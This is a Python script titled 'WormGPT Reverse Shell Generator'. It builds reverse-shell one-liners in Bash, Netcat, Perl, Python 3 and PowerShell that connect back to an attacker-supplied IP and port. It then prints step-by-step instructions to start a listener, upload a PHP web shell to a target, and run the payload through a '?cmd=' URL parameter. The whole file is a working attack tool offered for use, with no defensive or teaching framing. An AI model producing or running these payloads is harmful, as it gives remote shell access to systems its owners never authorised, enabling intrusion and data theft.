#!/usr/bin/env python3
"""
reverse_shell_builder.py
Generates the exact command string required to trigger a reverse shell
via the ultimate_php2shell.php endpoint.
"""

import sys

def generate_bash_reverse_shell(ip: str, port: int, encoding: str = 'utf-8') -> str:
 """
 Generates a Bash Reverse Shell command.
 """
 cmd = f"exec 5<>/dev/tcp/{ip}/{port}; cat <&5 | while read line; do $line 2>&5 & done; while true; do sleep 0.1; done"
 return cmd

def generate_netcat_reverse_shell(ip: str, port: int) -> str:
 """
 Generates a standard Netcat Reverse Shell command.
 """
 cmd = f"nc -e /bin/bash {ip} {port}"
 return cmd

def generate_perl_reverse_shell(ip: str, port: int) -> str:
 """
 Generates a Perl Reverse Shell.
 """
 cmd = f'perl -e \'use Socket;$i={ip};$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''
 return cmd

def generate_python3_reverse_shell(ip: str, port: int) -> str:
 """
 Generates a Python 3 Reverse Shell.
 """
 cmd = f'python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")\''
 return cmd

def generate_windows_reverse_shell(ip: str, port: int) -> str:
 """
 Generates a Windows Reverse Shell using PowerShell.
 """
 cmd = (
 f"powershell -noexit -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});"
 "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
 "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
 "$sendback = (iex $data 2>&1 | Out-String );"
 "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
 "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
 "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
 "$client.Close()\""
 )
 return cmd

def main() -> None:
 print("=== WormGPT Reverse Shell Generator ===")
 
 target_ip = input("Enter Attacker IP: ").strip()
 target_port = input("Enter Attacker Port: ").strip()

 print("\nSelect Payload Type:")
 print("1. Bash (Linux)")
 print("2. Netcat (Linux/Windows)")
 print("3. Perl (Linux)")
 print("4. Python 3 (Linux)")
 print("5. PowerShell (Windows)")

 choice = input("Choice [1-5]: ").strip()

 payload = ""
 os_type = "Linux"

 # Logic fixed: Early exits removed to prevent 'unreachable' warnings
 if choice == '1':
 payload = generate_bash_reverse_shell(target_ip, int(target_port))
 os_type = "Bash"
 elif choice == '2':
 payload = generate_netcat_reverse_shell(target_ip, int(target_port))
 os_type = "Netcat"
 elif choice == '3':
 payload = generate_perl_reverse_shell(target_ip, int(target_port))
 os_type = "Perl"
 elif choice == '4':
 payload = generate_python3_reverse_shell(target_ip, int(target_port))
 os_type = "Python 3"
 elif choice == '5':
 payload = generate_windows_reverse_shell(target_ip, int(target_port))
 os_type = "PowerShell"
 else:
 print("Invalid choice.")
 return

 print("\n" + "=" * 50)
 print(f"Target OS: {os_type}")
 print(f"Command to execute via php2shell:")
 print("-" * 50)
 print(payload)
 print("-" * 50)
 print("\nInstructions:")
 print(f"1. Start your listener (e.g., nc -lvnp {target_port}).")
 print(f"2. Upload ultimate_php2shell.php to the target.")
 print(f"3. Access it at: http://target/?cmd={payload}")
 print("=" * 50)

if __name__ == "__main__":
 main()